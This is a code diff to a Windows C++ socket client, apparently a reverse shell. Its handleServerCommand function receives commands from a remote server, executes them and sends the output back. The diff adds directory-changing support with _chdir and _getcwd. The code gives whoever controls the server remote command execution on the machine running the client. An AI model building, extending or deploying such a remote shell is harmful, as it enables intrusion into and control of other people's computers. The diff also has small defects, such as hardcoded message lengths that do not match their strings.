@@ -2,6 +2,7 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <array>
+#include <direct.h> // lib for handling directories
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -103,10 +104,31 @@ void handleServerCommand(SOCKET clientSocket) {
             string command(buffer);
 
             if(command == "exit") break;
-            
-            // executes command and sends the result to server side 
-            string result = executeCommand(command);
-            send(clientSocket, result.c_str(), result.length(), 0);
+
+            // rfind verifies if command starts with cd
+            if(command.rfind("cd", 0) == 0) {
+                string newDir = command.substr(3);     // command starts from cd, which is the 0 position.This means that our new directories start from third character
+                if(_chdir(newDir.c_str()) == 0) {
+                    // getting current directory
+                    char currentDir[1024];
+                    if(_getcwd(currentDir, sizeof(currentDir))) {
+                        string Message = "Director changed to " + string(currentDir) + "\n";
+                        send(clientSocket, Message.c_str(), Message.length(), 0);
+                    }
+                    else {
+                        send(clientSocket, "Directory changed but failed to retrieve new directory.\n", 57, 0);
+                    }
+                }
+                else {
+                    send(clientSocket, "Failed to change directory.\n", 29, 0);
+                }
+            }
+            else {
+                 // executes command and sends the result to server side 
+                string result = executeCommand(command);
+                send(clientSocket, result.c_str(), result.length(), 0);                
+            }
+
         }else if(iResult == 0) {
             cout << "Connection closed." << endl;
             break;
